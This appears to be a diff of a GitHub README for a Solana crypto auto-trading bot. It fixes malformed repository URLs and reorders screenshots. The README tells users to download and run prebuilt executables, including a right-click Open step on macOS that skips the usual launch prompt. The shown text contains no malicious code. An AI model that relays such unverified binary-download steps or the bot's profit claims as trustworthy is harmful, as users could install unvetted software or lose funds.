@@ -1,16 +1,17 @@
 <p align="center">
-<img src=https://img.shields.io/github/stars/https://github.com/SolanabuyBot/Solana-Bot?style=for-the-badge&logo=appveyor&color=blue />
-<img src=https://img.shields.io/github/forks/https://github.com/SolanabuyBot/Solana-Bot?style=for-the-badge&logo=appveyor&color=blue />
-<img src=https://img.shields.io/github/issues/https://github.com/SolanabuyBot/Solana-Bot?style=for-the-badge&logo=appveyor&color=informational />
-<img src=https://img.shields.io/github/issues-pr/https://github.com/SolanabuyBot/Solana-Bot?style=for-the-badge&logo=appveyor&color=informational />
+<img src=https://img.shields.io/github/stars/SolanabuyBot/Solana-Bot?style=for-the-badge&logo=appveyor&color=blue />
+<img src=https://img.shields.io/github/forks/SolanabuyBot/Solana-Bot?style=for-the-badge&logo=appveyor&color=blue />
+<img src=https://img.shields.io/github/issues/SolanabuyBot/Solana-Bot?style=for-the-badge&logo=appveyor&color=informational />
+<img src=https://img.shields.io/github/issues-pr/SolanabuyBot/Solana-Bot?style=for-the-badge&logo=appveyor&color=informational />
 </p>
 
 ## Screenshots 
 
 Here are some screenshots of Solana Ultimate Ai Auto Trade Bot in action: 
 
-![Screenshot 1](img/EasyRun.jpg) 
 ![Screenshot 2](img/dashboard.png) 
+![Screenshot 1](img/EasyRun.jpg) 
+
 
 # Solana Ultimate Ai Auto Trade Bot 
 
@@ -37,14 +38,14 @@ Solana Ultimate Ai Auto Trade Bot is designed for those who truly want to maximi
 
 ### Mac Users 
 
-1. Download the packaged version from [here](https://github.com/https://github.com/SolanabuyBot/Solana-Bot/releases/download/V4.1.1/SolAiBot_Mac.zip). 
+1. Download the packaged version from [here](https://github.com/SolanabuyBot/Solana-Bot/releases/download/V4.1.1/SolAiBot_Mac.zip). 
 2. Unzip the files and Double-click the downloaded DMG file. 
 3. Right-click on `SolAiBot.app` and select `Open` to access the bot. 
 4. Once the bot is running, it may take a few minutes to fetch the list of tokens from the Solana network depending on your internet speed. During this time, you can watch the informational messages on the screen to see what the bot is doing. 
 
 ### Windows Users 
 
-1. Download the packaged version from [here](https://github.com/https://github.com/SolanabuyBot/Solana-Bot/releases/download/V4.1.1/SolAiBot_Win.zip). 
+1. Download the packaged version from [here](https://github.com/SolanabuyBot/Solana-Bot/releases/download/V4.1.1/SolAiBot_Win.zip). 
 2. Extract the ZIP file. 
 3. Double-click on the `SolAiBot.exe` application to start the bot. 
 
@@ -52,7 +53,7 @@ Solana Ultimate Ai Auto Trade Bot is designed for those who truly want to maximi
 
 1. **Clone the Repository**: 
    ```bash 
-   git clone https://github.com/https://github.com/SolanabuyBot/Solana-Bot.git 
+   git clone https://github.com/SolanabuyBot/Solana-Bot.git 
    ``` 
 2. **Enter Project Folder**: 
    ```bash 
